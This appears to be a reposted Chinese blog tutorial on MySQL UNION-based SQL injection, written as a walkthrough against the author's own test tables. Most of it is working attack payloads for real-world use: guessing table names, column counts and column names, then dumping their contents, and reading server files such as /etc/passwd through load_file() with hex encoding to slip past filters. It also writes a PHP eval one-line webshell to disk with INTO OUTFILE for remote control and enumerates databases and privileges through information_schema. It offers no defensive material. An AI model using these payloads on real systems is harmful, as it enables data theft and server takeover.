# [黑客攻防之SQL注入原理解析入门教程][0]

 2012-11-07 14:54  12507人阅读  

版权声明：随意转载。


1. [一 UNION 的原理][5]
1. [二load_file和UNION 读取服务器文件内容][6]
1. [三 用select into outfile 把一句话木马写进文件][7]
1. [四用系统函数UNOIN暴出数据库的信息如果web不禁用极其高效][8]

出现的关键名词有： UNION SELECT load_file hex 

为了方便说明我们先创建两个表：hehe和heihei，很明显它们一个拥有2列属性，一个拥有3列属性

![][9]

==========================================================================================

## 一. UNION 的原理

UNION 需要两个被select的集合拥有相同的列数。一开始我并不是很理解这个相同是什么，然后我做了个实验：

![][10]

这个错误提示很明显了：ERROR 1222 (21000): The used SELECT statements have a different number of columns

因为它们select出来的结果集的列数不一致，这对一个操作并集合的union来说是不可操作的，所以就报错了。

那么是不是只要保证两个结果集的列数相同就好了呢，我们继续做实验，

![][11]

这个结果也是很明显：OK !!!

**总结：union连结的两个结果集的列数要相等！**

****

那么我们是怎么利用UNION搞注入呢？

（1）猜解表名，只有猜解对了表名才能继续深入。用这句：


    select * from hehe where id = 3 and exists(select * from admin);

**exists()函数**用于检查子查询是否至少会返回一行数据。实际上不返回任何数据，而是返回True或者False。结果当然是不存在啦：

![][12]

如果表名存在就返回结果集：

![][13]

**总结：在实战中我们可以用exsits()猜解表名**

(2)用UNION猜解列数（- - 终于用到了UNION）

原理是：利用两边结果集必须相等列数！



    select * from hehe where id =3 and 1=1 union select 1,2,3;

![][14]

如图，第一次我们猜测两列（1,2）失败了，第二次我们猜测三列（1,2,3）成功了。

**总结：我们用and union select 1,2,3,4,5,6...;来猜解列数，只有列数相等了，才能返回True！**

(3)猜解列名

用猜解表名的方法： 


     select * from hehe where id=3 and exists(select name from hehe);

![][15]

  
如图，第一次我们猜解有个列名为name1，报错了，第二次我们猜解列名为name，返回正常，说明真的有个列名为name！

**总结：用 select * from hehe where id=3 and exists(select name from hehe);来猜解列名！**

(4)猜解字段内容

这个通过步骤三我们已经猜解出列名：name和id了。那么怎么让它们暴出内容呢？

用： 

    select * from hehe where id=3 and 1=2  union select 0,0,name from hehe;

## 

![][16]

  
**总结：知道列名后，把列名至于其中任意位置，就能在那个位置暴出列的内容来。实战中不是每一个列的内容都显示在web page上的，所以有的人就先用:**


    unoin select 1,2,3,4,5,6,7 from hehe;

之类的语句，看看web page上出现的数字为几就把列名填写在第几个列上，如：web page上暴出5，那么我们就把SQL语句改成：


    unoin select 1,2,3,4,name,6,7 from hehe;

然后就能暴出来name的内容啦。。

## 二.load_file()和UNION 读取服务器文件内容 

函数 LOAD_FILE(file_name)：读取文件并将这一文件按照字符串的格式返回。 

文件的位置必须在服务器上 , 你必须为文件制定路径全名，而且你还必须拥有 FILE 特许权。

文件必须可读取，文件容量必须小于 max_allowed_packet 字节。

若文件不存在，或因不满足上述条件而不能被读取， 则函数返回值为 NULL。

这个load_file()看起来很正常，因为它就是加载一个绝对路径文件（先保证有读权限）。可是神奇的是:

**它可以在UNOIN中充当一个字段，能够来读取服务器的文件。**

在我的服务器上有个文件："d:/test.txt"，里面内容是："key:HelloWorld."，看我用load_file把他读取出来：


    select * from hehe where id=3 and 1=2 union select 0,load_file("d:/test.txt"),count(*) from mysql.user;

![][17]

**总结：“A语句 UNION B语句” 中的这个UNION就是把最终的结果集放到“A语句"的属性（列）下。上图上结果是把0，放到列1下，把load_file("d:/tes.txt")的内容放到列2下，把count(*)返回的结果放到列3下。很科学地达到了我们读取服务器文件的目的。**

****

Ps：上面的 1=2 看到了吗？是让”A语句“查询结果为空，看着舒服。

Ps：这个load_file()用在MySQL中

**load_file的过滤**

实战中URL写成load_file("/etc/passwd")一般会被过滤，所以不科学，不过我们可以用16进制来表示（hex）就好啦：

打开UltraEdit，然后把 /etc/passwd 放到里面，然后右键有个16进制编辑，然后就看到了 16进制 了： 0x2F6574632F706173737764，知道为什么要加这个“0x”吗？因为它是16进制。。。

**Ps：经验哦~如果过滤了空格就用“+”表示**

## 三 用select into outfile 把一句话木马写进文件 


    select '<?php eval($_POST[cmd])?>'  into outfile 'c://aa.php';

![][18]

然后我们将会看到：

![][19]

里面有一句话木马： **<?php eval($_POST[cmd]) ?>**然后就能用菜刀去连接了。（什么不知道什么叫做一句话木马？什么叫做菜刀？赶紧去google吧）

**总结：获得数据库权限真的是一件好事啊~~**

## 四.用系统函数+UNOIN暴出数据库的信息（如果web不禁用，极其高效！）

**information_schema.SCHEMATA表中的SCHEMA_NAME**查看 **所有的数据库** **：**


    select * from hehe where id=3 and 1=2  union select 0,0,SCHEMA_NAME from information_schema.SCHEMATA limit 1,2;

![][20]

****

**information_schema.TABLES 表中的TABLE_NAME和TABLE_SCHEMA查看 所有的表名和所在的数据库：**


    select TABLE_NAME ,TABLE_SCHEMA from information_schema.TABLES where TABLE_SCHEMA = "haha"

**![][21]**

****

**information_schema.COLUMNS 表中的 COLUMN_NAME 查看表中的所有列名 ：**


    select TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME= "hehe"l

****

**![][22]**

****

**version()** 版本 （看第一列）**：**

![][23]

**database() 当前** 数据库名字 （看第一列）**：**

![][24]

**user() 当前** 用户 （看第一列）**：**

![][25]

**@@global.version_compile_os** 操作系统 （看第一列）：  
![][26]

**and ord(mid(user(),1,1))=144** 查看 数据库权限 （注意144就是字符”r“，也就是”root“的第一个字符）：

**![][27]**

Ps：有更好的unoin select user(),2,3 ;不用？ 不是的，因为实战中有的web不准用。用这个就可以来查看数据库权限啦~

Ps：ord()， 若字符串str 的最左字符是一个多字节字符，则返回该字符的代码。（多字节。。有意思。。）

**总结：这个information_schema数据库是个特别强大的数据库，里面包含的表很多，有SCHEMATAS（数据库信息），TABLES（表信息）,COLUMNS（列信息）等等。。。**

[0]: http://blog.csdn.net/emaste_r/article/details/8156108
[4]: #
[5]: #t0
[6]: #t2
[7]: #t3
[8]: #t4
[9]: ../img/1352253846_8091.png
[10]: ../img/1352254022_5092.PNG
[11]: ../img/1352254257_9095.PNG
[12]: ../img/1352255252_3354.PNG
[13]: ../img/1352255476_6499.PNG
[14]: ../img/1352255740_3935.PNG
[15]: ../img/1352268271_7414.PNG
[16]: ../img/1352267865_5540.PNG
[17]: ../img/1352260121_8624.PNG
[18]: ../img/1352277393_2619.PNG
[19]: ../img/1352277427_4798.PNG
[20]: ../img/1352269608_4152.PNG
[21]: ../img/1352271242_1019.PNG
[22]: ../img/1352271465_3588.PNG
[23]: ../img/1352265001_2115.PNG
[24]: ../img/1352265099_6455.PNG
[25]: ../img/1352265202_6346.PNG
[26]: ../img/1352265847_4536.PNG
[27]: ../img/1352268965_6686.PNG